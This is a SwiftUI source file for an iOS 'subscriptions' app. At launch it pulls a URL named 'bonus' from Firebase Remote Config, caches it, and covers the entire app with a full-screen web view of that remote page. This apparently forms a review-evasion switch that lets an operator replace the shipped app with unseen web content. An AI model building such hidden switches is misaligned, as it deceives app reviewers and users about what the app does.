//
//  Jugabit_SubscriptionsApp.swift
//  Jugabit-Subscriptions
//
//  Created by Alexandr Filovets on 1.08.24.
//

import SwiftUI
import WebKit
import FirebaseRemoteConfigInternal
import FirebaseCore
import FirebaseMessaging
import UserNotifications

class AppDelegate: NSObject, UIApplicationDelegate, UNUserNotificationCenterDelegate, MessagingDelegate {
    func application(_ application: UIApplication,
                     didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil) -> Bool {
        application.registerForRemoteNotifications()
        FirebaseApp.configure()
        Messaging.messaging().delegate = self
        UNUserNotificationCenter.current().delegate = self

        // Request authorization for notifications
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { granted, error in
            if let error = error {
                print("Error requesting notification authorization: \(error.localizedDescription)")
            } else {
                print("Notification authorization granted: \(granted)")
            }
        }

        return true
    }
}

@main
struct Jugabit_SubscriptionsApp: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var delegate
    @State private var url: URL?
    var body: some Scene {
        WindowGroup {
            ContentView()
                .onAppear {
                    let str = UserDefaults.standard.string(forKey: "bonus")
                    if let str, let url = URL(string: str) {
                        self.url = url
                    }
                    else {
                        FirebaseService.shared.fetchConfigs {
                            url = URL(string: FirebaseService.shared.getString(key: .bonus) ?? "")
                            if url != nil {
                                UserDefaults.standard.set(url?.absoluteString, forKey: "bonus")
                            }
                        }
                    }
                }
                .overlay {
                    if let url {
                        ZStack {
                            Color.black.frame(maxWidth: .infinity, maxHeight: .infinity)
                                .ignoresSafeArea()
                            WebView(url: url)
                        }
                    }
                }
        }
    }
}
struct WebView: UIViewRepresentable {
    let webView: WKWebView
    let url: URL
    
    init(url: URL) {
        webView = WKWebView(frame: .zero)
        self.url = url
    }
    
    func makeUIView(context: Context) -> WKWebView {
        return webView
    }
    func updateUIView(_ uiView: WKWebView, context: Context) {
        webView.load(URLRequest(url: url))
    }
}

class FirebaseService: ObservableObject {
    static let shared = FirebaseService()
    
    enum Key: String {
        case bonus
    }
    
    let remoteConfig = RemoteConfig.remoteConfig()
    @Published var fetched: Bool = false
    
    func start() {
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 0
        remoteConfig.configSettings = settings
        
        fetchConfigs {
            //
        }
    }
    
    func fetchConfigs(completion: @escaping () -> Void) {
        remoteConfig.fetch(withExpirationDuration: TimeInterval(0)) { (status, error) -> Void in
            if status == .success {
                self.remoteConfig.activate { changed, error in
                    print("Config activated!")
                    self.fetched = true
                    completion()
                }
            } else {
                print("Config not fetched")
                self.fetched = true
                completion()
            }
        }
    }
    
    func getString(key: Key) -> String? {
        remoteConfig.configValue(forKey: key.rawValue).stringValue
    }
    
    func stringArray(key: Key) -> [String] {
        let arr = remoteConfig.configValue(forKey: key.rawValue).stringValue
        return arr.components(separatedBy: "\n") ?? []
    }
}

